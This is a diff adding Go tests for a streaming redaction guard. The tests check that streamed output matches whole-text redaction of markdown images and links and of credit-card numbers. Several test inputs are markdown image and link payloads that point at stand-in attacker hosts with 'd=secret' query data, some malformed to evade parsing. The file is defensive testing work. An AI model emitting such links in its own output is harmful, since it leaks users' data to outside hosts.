@@ -38,6 +38,11 @@ var streamInputs = []string{
 	"marker " + testCanary + " end" + filler + testCanary,
 	"Xin chào, đây là câu trả lời tiếng Việt có dấu " + filler + " email a@b.vn",
 	"![a](https://docs.example.com/" + strings.Repeat("k", 500) + ".png)" + filler,
+	// A parenthesised title closes before the link does.
+	filler + "![chart](https:/] (0))/evil.com/c.png?d=secret) after" + filler,
+	filler + "[x](https://evil.example/?d=" + strings.Repeat("S", 300) + " (t)) after" + filler,
+	filler + "[t](https://evil.com/x\r\n'title'\r) after" + filler,
+	filler + "4111-1111-1111-1111 4111 1111 1111 1111 " + filler,
 }
 
 // A stream must produce exactly what the whole-text guard produces, however
@@ -135,5 +140,44 @@ func TestFlushRemovesUnclosedImage(t *testing.T) {
 	got := st.Write("text ![x](https://evil.com/a.png?d=1") + st.Flush()
 	if got != "text [REDACTED:image]" {
 		t.Errorf("got %q", got)
+	}
+}
+
+// Two cards in one run of digits: cards are found by grouping the whole run,
+// so a stream must not send the first before the run has ended. Up to v0.3.0
+// a cut between them could let the second card through.
+func TestStreamAdjacentCards(t *testing.T) {
+	s := scanner(full)
+	for _, in := range []string{
+		filler + "card 4111 1111 1111 1111 4111-1111-1111-1111 end" + filler,
+		filler + "4111-1111-1111-1111 4111 1111 1111 1111 " + filler,
+		"4111-1111-1111-1111 4111 1111 1111 1111 ![chart](https://evil.com/c.png?d=secret) for\nbread " + filler,
+	} {
+		want := s.Text(in, Counts{})
+		if strings.Count(want, "[REDACTED:card]") != 2 {
+			t.Fatalf("whole text: %q", want)
+		}
+		for n := 1; n <= 64; n++ {
+			if got, _ := streamed(s, in, n); got != want {
+				t.Errorf("pieces of %d:\n got  %q\n want %q", n, got, want)
+			}
+		}
+	}
+}
+
+// A stream holds back only what could still change, not a fixed window: plain
+// text goes out within a scan batch and a word.
+func TestStreamHoldsLittle(t *testing.T) {
+	st := scanner(full).NewStream()
+	in := strings.Repeat("Banana bread needs ripe bananas. ", 40)
+	sent := 0
+	for i := 0; i < len(in); i += 8 {
+		sent += len(st.Write(in[i : i+8]))
+		if held := i + 8 - sent; held > scanEvery+len("bananas. ") {
+			t.Fatalf("after %d bytes, %d are held", i+8, held)
+		}
+	}
+	if sent+len(st.Flush()) != len(in) {
+		t.Error("text changed")
 	}
 }
